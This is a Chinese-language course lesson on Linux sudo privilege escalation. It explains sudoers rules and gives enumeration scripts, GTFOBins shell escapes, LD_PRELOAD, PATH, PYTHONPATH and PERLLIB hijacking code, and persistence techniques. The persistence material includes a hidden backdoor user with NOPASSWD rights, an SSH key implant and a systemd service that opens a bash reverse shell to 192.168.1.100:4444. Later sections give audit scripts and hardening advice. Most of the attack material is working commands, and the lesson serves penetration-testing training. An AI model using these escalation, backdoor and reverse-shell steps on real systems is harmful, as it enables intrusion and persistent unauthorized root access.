# 课时03 SUDO提权

## 一、课程目标

本节课主要学习Linux系统中利用sudo配置不当进行提权的技术和方法。sudo提权是Linux系统中最常见且最容易被利用的提权方式之一。通过本课的学习，你将能够：

1. 理解sudo的工作原理和安全机制
2. 掌握查找和利用sudo配置漏洞进行提权的方法
3. 学会使用常见的sudo提权工具和技术
4. 了解sudo提权的防护措施和最佳实践
5. 熟悉GTFOBins等sudo利用资源

## 二、名词解释表

| 名词 | 解释 |
|------|------|
| sudo | Super User Do，以超级用户身份执行命令 |
| sudoers | sudo配置文件，定义用户权限规则 |
| NOPASSWD | 无需密码即可执行sudo命令 |
| ALL | 所有命令或所有用户 |
| Runas | 指定运行命令的用户 |
| Privilege Escalation | 权限提升，从低权限用户提升到高权限用户 |
| GTFOBins | Get The F*** Out_bins，sudo二进制文件利用数据库 |

## 三、技术原理

### 3.1 sudo概述

sudo是一个程序，允许用户以其他用户（通常是root）的身份运行命令。它是Linux系统中权限管理的重要工具。

#### sudo工作原理
1. 用户执行sudo命令
2. sudo检查/etc/sudoers配置文件
3. 验证用户是否有执行该命令的权限
4. 如果有权限且认证通过，以目标用户身份执行命令
5. 记录操作日志

#### sudo配置文件
```bash
# /etc/sudoers文件结构
user/host = command
username ALL=(ALL:ALL) ALL
%groupname ALL=(ALL:ALL) ALL
```

### 3.2 sudo安全机制

#### 认证机制
- **密码认证**：需要输入用户密码
- **时间窗口**：默认5分钟内无需重复输入密码
- **会话管理**：基于TTY的会话跟踪

#### 权限控制
- **细粒度控制**：可以限制特定命令
- **用户组支持**：支持基于组的权限管理
- **主机限制**：可以限制特定主机

### 3.3 提权原理

#### 利用条件
1. 目标系统存在配置不当的sudo规则
2. 当前用户在sudoers文件中有相关权限
3. sudo规则允许执行可利用的命令

#### 提权过程
1. 检查当前用户的sudo权限
2. 分析可执行的命令和参数
3. 利用命令获得高权限shell
4. 验证权限提升结果

## 四、sudo权限检查

### 4.1 基础检查命令

#### 查看当前用户sudo权限
```bash
# 查看当前用户可以执行的sudo命令
sudo -l

# 详细显示权限信息
sudo -l -v

# 以其他用户身份查看sudo权限
sudo -U username -l
```

#### 查看sudo配置
```bash
# 查看sudoers文件（需要root权限）
cat /etc/sudoers

# 使用visudo安全编辑sudoers文件
sudo visudo

# 查看sudoers.d目录中的配置
ls -la /etc/sudoers.d/
cat /etc/sudoers.d/*
```

### 4.2 高级检查技巧

#### 检查NOPASSWD配置
```bash
# 查找NOPASSWD规则
sudo -l 2>/dev/null | grep NOPASSWD

# 或者检查sudoers文件
grep -r "NOPASSWD" /etc/sudoers*

# 查找所有不需要密码的sudo规则
cat /etc/sudoers | grep -v "^#" | grep -v "^$" | grep NOPASSWD
```

#### 检查ALL权限
```bash
# 查找具有ALL权限的用户
grep -r "(ALL" /etc/sudoers*

# 查找可以以root身份执行所有命令的规则
sudo -l | grep "(root)" | grep "ALL"
```

### 4.3 自定义检查脚本

```bash
#!/bin/bash
# sudo_checker.sh - sudo权限检查脚本

echo "=== sudo权限检查工具 ==="
echo "检查时间: $(date)"
echo ""

# 检查当前用户sudo权限
echo "1. 当前用户sudo权限:"
if command -v sudo &> /dev/null; then
    sudo -l 2>/dev/null
else
    echo "sudo命令未安装"
fi
echo ""

# 检查NOPASSWD规则
echo "2. NOPASSWD规则检查:"
if [ -r /etc/sudoers ]; then
    grep -v "^#" /etc/sudoers | grep -v "^$" | grep -i NOPASSWD
    # 检查sudoers.d目录
    if [ -d /etc/sudoers.d ]; then
        for file in /etc/sudoers.d/*; do
            if [ -r "$file" ]; then
                echo "文件: $file"
                grep -v "^#" "$file" | grep -v "^$" | grep -i NOPASSWD
            fi
        done
    fi
else
    echo "无法读取/etc/sudoers文件"
fi
echo ""

# 检查危险命令权限
echo "3. 危险命令权限检查:"
DANGEROUS_COMMANDS=("vim" "nano" "find" "bash" "sh" "python" "perl" "awk" "nmap" "zip" "tar")
for cmd in "${DANGEROUS_COMMANDS[@]}"; do
    if command -v $cmd &> /dev/null; then
        sudo -l 2>/dev/null | grep -w $cmd > /dev/null
        if [ $? -eq 0 ]; then
            echo "  [警告] 可以使用sudo执行: $cmd"
        fi
    fi
done
```

## 五、常见sudo提权方法

### 5.1 NOPASSWD提权

#### 漏洞原理
当sudo配置为NOPASSWD时，用户可以无需密码直接执行sudo命令。

#### 利用方法
```bash
# 检查NOPASSWD权限
sudo -l

# 如果发现NOPASSWD ALL权限
# 直接获得root shell
sudo su -
sudo bash
sudo sh
```

#### 示例配置
```bash
# /etc/sudoers中的危险配置
username ALL=(ALL:ALL) NOPASSWD: ALL
%users ALL=(ALL:ALL) NOPASSWD: ALL
```

### 5.2 特定命令提权

#### vim提权
```bash
# 如果可以sudo vim
sudo vim

# 在vim中执行shell
:!sh
:shell
```

#### find提权
```bash
# 如果可以sudo find
sudo find . -exec /bin/sh \; -quit

# 或者
sudo find . -exec /bin/bash -p \; -quit
```

#### python提权
```bash
# 如果可以sudo python
sudo python -c "import os; os.system('/bin/bash')"

# 或者
sudo python -c "import pty; pty.spawn('/bin/bash')"
```

#### awk提权
```bash
# 如果可以sudo awk
sudo awk 'BEGIN {system("/bin/bash")}'

# 或者
echo | sudo awk '{print system("/bin/bash")}'
```

### 5.3 环境变量提权

#### LD_PRELOAD利用
```bash
# 创建恶意共享库
cat > /tmp/malicious.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
EOF

# 编译共享库
gcc -fPIC -shared -o /tmp/malicious.so /tmp/malicious.c -nostartfiles

# 如果sudo命令会加载共享库
sudo LD_PRELOAD=/tmp/malicious.so apache2
```

#### PATH劫持
```bash
# 创建恶意程序
cat > /tmp/sh << 'EOF'
#!/bin/bash
/bin/bash
EOF

# 添加执行权限
chmod +x /tmp/sh

# 修改PATH并执行sudo命令
sudo PATH=/tmp:$PATH less /etc/profile
# 在less中执行!sh
```

## 六、自动化提权工具

### 6.1 sudo提权脚本

```bash
#!/bin/bash
# sudo_exploiter.sh - sudo提权自动化脚本

echo "=== sudo提权检测工具 ==="

# 检查sudo权限
check_sudo_permissions() {
    echo "检查sudo权限..."
    if sudo -l 2>/dev/null | grep -q "may run the following commands"; then
        echo "[+] 用户具有sudo权限"
        sudo -l
    else
        echo "[-] 用户没有sudo权限或需要密码"
        return 1
    fi
}

# 检查NOPASSWD权限
check_nopasswd() {
    echo "检查NOPASSWD权限..."
    if sudo -l 2>/dev/null | grep -qi NOPASSWD; then
        echo "[+] 发现NOPASSWD权限"
        sudo -l 2>/dev/null | grep -i NOPASSWD
        return 0
    else
        echo "[-] 未发现NOPASSWD权限"
        return 1
    fi
}

# 尝试常见提权方法
try_common_exploits() {
    echo "尝试常见sudo提权方法..."
    
    # 检查可以sudo执行的危险命令
    DANGEROUS_COMMANDS=("vim" "find" "bash" "sh" "python" "perl" "awk" "nmap")
    
    for cmd in "${DANGEROUS_COMMANDS[@]}"; do
        if sudo -l 2>/dev/null | grep -qw $cmd; then
            echo "[+] 可以sudo执行: $cmd"
            
            # 根据命令类型尝试提权
            case $cmd in
                "vim")
                    echo "    尝试vim提权: sudo vim -c ':shell'"
                    ;;
                "find")
                    echo "    尝试find提权: sudo find . -exec /bin/sh \\; -quit"
                    ;;
                "bash"|"sh")
                    echo "    尝试shell提权: sudo $cmd"
                    ;;
                "python")
                    echo "    尝试python提权: sudo python -c 'import os; os.system(\"/bin/bash\")'"
                    ;;
                "perl")
                    echo "    尝试perl提权: sudo perl -e 'exec \"/bin/bash\";'"
                    ;;
                "awk")
                    echo "    尝试awk提权: sudo awk 'BEGIN {system(\"/bin/bash\")}'"
                    ;;
                "nmap")
                    echo "    尝试nmap提权: sudo nmap --interactive"
                    ;;
            esac
        fi
    done
}

# 主执行流程
main() {
    if check_sudo_permissions; then
        check_nopasswd
        try_common_exploits
    else
        echo "无法进行sudo提权测试"
    fi
}

# 执行主函数
main
```

### 6.2 GTFOBins sudo利用

#### GTFOBins简介
GTFOBins不仅包含SUID利用方法，也包含sudo利用方法。

#### 使用方法
```bash
# 查询特定命令的sudo利用方法
# 访问 https://gtfobins.github.io/
# 搜索命令如bash、find、vim等

# 命令行查询示例
curl -s https://gtfobins.github.io/gtfobins/bash/ | grep -A 10 "Sudo"
```

#### 本地查询脚本
```bash
#!/bin/bash
# gtfobins_sudo_checker.sh - 本地GTFOBins sudo查询

check_sudo_exploit() {
    local binary=$1
    echo "检查 $binary 的sudo利用方法:"
    
    case $binary in
        "bash")
            echo "  sudo bash"
            ;;
        "find")
            echo "  sudo find . -exec /bin/sh \\; -quit"
            ;;
        "vim")
            echo "  sudo vim -c ':shell'"
            ;;
        "nmap")
            echo "  sudo nmap --interactive"
            ;;
        "python")
            echo "  sudo python -c 'import os; os.system(\"/bin/bash\")'"
            ;;
        "perl")
            echo "  sudo perl -e 'exec \"/bin/bash\";'"
            ;;
        "awk")
            echo "  sudo awk 'BEGIN {system(\"/bin/bash\")}'"
            ;;
        *)
            echo "  请查询 https://gtfobins.github.io/ 获取利用方法"
            ;;
    esac
    echo ""
}

# 检查可以sudo执行的命令
if command -v sudo &> /dev/null; then
    echo "=== 可以sudo执行的命令 ==="
    sudo -l 2>/dev/null | grep -E "^[[:space:]]*[a-zA-Z/]" | while read line; do
        # 提取命令名称
        cmd=$(echo $line | awk '{print $NF}' | xargs basename)
        if [ ! -z "$cmd" ]; then
            check_sudo_exploit $cmd
        fi
    done
fi
```

## 七、手工提权技术

### 7.1 环境变量利用

#### PYTHONPATH利用
```bash
# 创建恶意Python模块
mkdir -p /tmp/malicious
cat > /tmp/malicious/os.py << 'EOF'
import os
import sys

def system(cmd):
    os.system("/bin/bash")

# 重定向标准导入
import builtins
builtins.os = sys.modules[__name__]
EOF

# 如果可以sudo python
sudo PYTHONPATH=/tmp/malicious python -c "import os; os.system('id')"
```

#### PERLLIB利用
```bash
# 创建恶意Perl模块
mkdir -p /tmp/malicious
cat > /tmp/malicious/strict.pm << 'EOF'
package strict;
sub import {
    system("/bin/bash");
}
1;
EOF

# 如果可以sudo perl
sudo PERLLIB=/tmp/malicious perl -e "use strict;"
```

### 7.2 文件写入利用

#### sudoers文件修改
```bash
# 如果可以sudo编辑文件
sudo vim /etc/sudoers

# 添加NOPASSWD规则
# username ALL=(ALL:ALL) NOPASSWD: ALL

# 或者创建新规则文件
echo "username ALL=(ALL:ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/backdoor
```

#### 日志文件利用
```bash
# 如果可以sudo写入日志文件
sudo sh -c 'echo "username ALL=(ALL:ALL) NOPASSWD: ALL" >> /var/log/sudo.log'
# 然后尝试移动或链接到sudoers文件
```

## 八、权限维持

### 8.1 sudo后门

#### 创建sudo后门
```bash
# 创建后门用户
sudo useradd -m backdoor -s /bin/bash
echo "backdoor:password123" | sudo chpasswd

# 添加sudo权限
echo "backdoor ALL=(ALL:ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/backdoor

# 隐藏后门文件
sudo chmod 640 /etc/sudoers.d/backdoor
sudo chown root:root /etc/sudoers.d/backdoor
```

#### 时间窗口后门
```bash
# 修改sudo时间窗口
# 编辑/etc/sudoers
sudo visudo

# 添加或修改
Defaults timestamp_timeout=60
# 设置60分钟的sudo时间窗口
```

### 8.2 系统服务后门

#### systemd服务后门
```bash
# 创建systemd服务文件
cat > /tmp/backdoor.service << 'EOF'
[Unit]
Description=Backdoor Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'while true; do /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; sleep 3600; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# 复制到系统目录
sudo cp /tmp/backdoor.service /etc/systemd/system/
sudo systemctl enable backdoor.service
sudo systemctl start backdoor.service
```

## 九、防护措施

### 9.1 sudo配置审计

#### 安全配置检查脚本
```bash
#!/bin/bash
# sudo_auditor.sh - sudo配置审计工具

echo "=== sudo配置安全审计 ==="
echo "审计时间: $(date)"
echo ""

# 检查sudoers文件权限
echo "1. sudoers文件权限检查:"
ls -l /etc/sudoers
if [ ! -r /etc/sudoers ]; then
    echo "[严重] 无法读取sudoers文件"
fi

# 检查sudoers.d目录
echo "2. sudoers.d目录检查:"
if [ -d /etc/sudoers.d ]; then
    ls -la /etc/sudoers.d/
    for file in /etc/sudoers.d/*; do
        if [ -r "$file" ]; then
            echo "文件: $file"
            ls -l "$file"
        fi
    done
fi
echo ""

# 检查危险配置
echo "3. 危险配置检查:"
# 检查NOPASSWD ALL
grep -r "NOPASSWD.*ALL" /etc/sudoers*
if [ $? -eq 0 ]; then
    echo "[警告] 发现NOPASSWD ALL配置"
fi

# 检查ALL权限
grep -r ") ALL" /etc/sudoers* | grep -v "root ALL="
if [ $? -eq 0 ]; then
    echo "[警告] 发现非root用户的ALL权限"
fi
echo ""

# 检查特定危险命令
echo "4. 危险命令权限检查:"
DANGEROUS_COMMANDS=("vim" "nano" "find" "bash" "sh" "python" "perl" "awk")
for cmd in "${DANGEROUS_COMMANDS[@]}"; do
    grep -r "$cmd" /etc/sudoers* > /dev/null
    if [ $? -eq 0 ]; then
        echo "[注意] 发现$cmd的sudo权限"
    fi
done
```

### 9.2 系统加固

#### 安全sudo配置
```bash
# 推荐的sudoers配置
# /etc/sudoers安全配置示例

# 设置安全选项
Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
Defaults env_reset
Defaults mail_badpass
Defaults secure_syslog=auth
Defaults logfile=/var/log/sudo.log
Defaults log_host
Defaults log_year
Defaults passwd_tries=3
Defaults timestamp_timeout=5

# 用户组权限
%wheel ALL=(ALL:ALL) ALL
%sudo ALL=(ALL:ALL) ALL

# 限制特定命令
username ALL=(root) /usr/bin/systemctl, /usr/bin/service
```

#### 日志监控
```bash
# 配置sudo日志
# 在/etc/sudoers中添加
Defaults logfile=/var/log/sudo.log
Defaults log_host
Defaults log_year

# 监控sudo日志
tail -f /var/log/sudo.log

# 使用rsyslog集中日志
echo "local2.* /var/log/sudo.log" >> /etc/rsyslog.d/sudo.conf
systemctl restart rsyslog
```

### 9.3 最佳实践

#### 权限最小化
```bash
# 遵循最小权限原则
# 只授予必需的权限
username ALL=(root) /usr/bin/systemctl restart apache2
username ALL=(root) /usr/bin/service apache2 *

# 避免使用ALL权限
# username ALL=(ALL:ALL) ALL  # 危险！
```

#### 定期审计
```bash
# 定期检查sudo配置
# 创建cron任务
echo "0 2 * * * /usr/local/bin/sudo_auditor.sh > /var/log/sudo_audit.log" | crontab -

# 定期轮转sudo日志
# 配置logrotate
cat > /etc/logrotate.d/sudo << 'EOF'
/var/log/sudo.log {
    daily
    rotate 30
    compress
    delaycompress
    missingok
    notifempty
    create 640 root root
}
EOF
```

## 十、实战案例

### 10.1 sudo提权完整流程

#### 信息收集阶段
```bash
# 1. 检查sudo权限
sudo -l

# 输出示例：
# User username may run the following commands on hostname:
#     (ALL) NOPASSWD: ALL

# 2. 分析权限配置
cat /etc/sudoers | grep -v "^#" | grep -v "^$"

# 3. 检查sudoers.d目录
ls -la /etc/sudoers.d/
```

#### 利用阶段
```bash
# 4. 直接获得root权限
sudo su -
# 或者
sudo bash
# 或者
sudo sh

# 5. 验证权限
id
# 输出: uid=0(root) gid=0(root) groups=0(root)

# 6. 维持访问
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

### 10.2 复杂环境提权

#### 有限权限利用
```bash
# 1. 发现有限sudo权限
sudo -l
# 输出示例：
# User username may run the following commands on hostname:
#     (root) /usr/bin/vim
#     (root) /usr/bin/find

# 2. 选择合适的利用方法
# 使用vim提权
sudo vim
# 在vim中执行
:!sh

# 3. 验证权限
id
whoami
```

## 十一、故障排除

### 11.1 常见问题

#### sudo权限不足
```bash
# 检查sudoers配置
sudo cat /etc/sudoers

# 检查用户组
groups
id

# 检查sudo服务状态
systemctl status sudo
```

#### 时间窗口问题
```bash
# 重置sudo时间窗口
sudo -k

# 强制重新认证
sudo -v
```

### 11.2 权限验证

#### 验证提权成功
```bash
# 检查当前权限
id
# 应该显示uid=0(root)

# 检查环境变量
env | grep -E "(USER|HOME|SHELL)"

# 测试特权操作
cat /etc/shadow
touch /root/test_file
```

## 十二、课后作业

1. **基础练习**：
   - 在实验环境中配置各种sudo规则
   - 练习使用不同方法进行sudo提权
   - 验证提权结果并清理环境
   - 使用GTFOBins查询sudo利用方法

2. **进阶练习**：
   - 编写自定义sudo利用脚本
   - 实现sudo配置审计工具
   - 配置系统防护措施
   - 研究新的sudo利用技术

3. **思考题**：
   - sudo提权相比其他提权方法的优势和劣势是什么？
   - 如何在保证便利性的同时提高sudo安全性？
   - 现代Linux发行版如何改进sudo的安全机制？

4. **扩展阅读**：
   - 研究sudo源码实现
   - 了解sudo安全公告和漏洞修复
   - 学习容器环境中的权限管理